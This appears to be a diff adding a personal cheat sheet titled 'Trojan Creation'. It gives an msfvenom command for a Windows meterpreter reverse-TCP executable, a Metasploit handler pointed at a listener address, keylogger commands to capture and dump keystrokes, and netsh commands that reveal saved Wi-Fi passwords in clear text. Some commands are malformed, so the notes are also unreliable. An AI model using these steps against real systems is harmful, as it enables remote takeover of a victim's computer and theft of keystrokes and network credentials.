@@ -1,0 +1,26 @@
+#Trojan Creation
+
+msfvenom -p windows/meterpreter/reverse_tcp - platform windows-a x86 -f exe LHOST
+/root/Desktop/trojan.exe
+msfconsole
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 444
+set LHOST 192.168.43.43
+exploit
+
+cd Desktop
+msfconsole trojan.exe
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 444
+set LHOST 192.168.43.43
+keyscan_start
+keyscan_dump
+
+#shell Command
+netsh wlan show profile-Get wifi
+netsh wlan show profile SLT 4GLTE key=clear-Get Wifi PW
+ipconfig
+exit
+
